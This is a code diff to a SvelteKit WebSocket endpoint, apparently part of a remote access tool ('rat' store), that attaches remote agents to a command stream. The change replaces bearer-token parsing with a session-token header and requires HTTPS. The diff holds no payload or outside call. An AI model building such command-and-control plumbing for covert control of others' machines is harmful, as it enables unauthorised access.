@@ -1,15 +1,10 @@
 import { error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
 import { registry, RegistryError } from '$lib/server/rat/store';
-import { COMMAND_STREAM_SUBPROTOCOL } from '../../../../../../../shared/constants/protocol';
-
-function extractBearerToken(headerValue: string | null): string | null {
-	if (!headerValue) {
-		return null;
-	}
-	const match = /^Bearer\s+(?<token>.+)$/i.exec(headerValue.trim());
-	return match?.groups?.token?.trim() ?? null;
-}
+import {
+        COMMAND_STREAM_SUBPROTOCOL,
+        AGENT_SESSION_TOKEN_HEADER
+} from '../../../../../../../shared/constants/protocol';
 
 function parseSubprotocolHeader(headerValue: string | null): string[] {
 	if (!headerValue) {
@@ -22,19 +17,24 @@ function parseSubprotocolHeader(headerValue: string | null): string[] {
 }
 
 export const GET: RequestHandler = ({ request, params, getClientAddress }) => {
-	if (request.headers.get('upgrade')?.toLowerCase() !== 'websocket') {
-		throw error(400, 'Expected WebSocket upgrade request');
-	}
+        if (request.headers.get('upgrade')?.toLowerCase() !== 'websocket') {
+                throw error(400, 'Expected WebSocket upgrade request');
+        }
 
-	const id = params.id;
-	if (!id) {
-		throw error(400, 'Missing agent identifier');
-	}
+        const url = new URL(request.url);
+        if (url.protocol !== 'https:') {
+                throw error(400, 'Secure transport required');
+        }
 
-	const key = extractBearerToken(request.headers.get('authorization'));
-	if (!key) {
-		throw error(401, 'Missing agent key');
-	}
+        const id = params.id;
+        if (!id) {
+                throw error(400, 'Missing agent identifier');
+        }
+
+        const token = request.headers.get(AGENT_SESSION_TOKEN_HEADER);
+        if (!token) {
+                throw error(401, 'Missing session token');
+        }
 
 	const requestedProtocols = parseSubprotocolHeader(request.headers.get('sec-websocket-protocol'));
 	if (!requestedProtocols.includes(COMMAND_STREAM_SUBPROTOCOL)) {
@@ -53,8 +53,8 @@ export const GET: RequestHandler = ({ request, params, getClientAddress }) => {
 
 	const { 0: client, 1: serverSocket } = new pairFactory();
 
-	try {
-		registry.attachSession(id, key, serverSocket, { remoteAddress: getClientAddress() });
+        try {
+                registry.attachSession(id, token, serverSocket, { remoteAddress: getClientAddress() });
 	} catch (err) {
 		serverSocket.close(1008, 'Session rejected');
 		if (err instanceof RegistryError) {
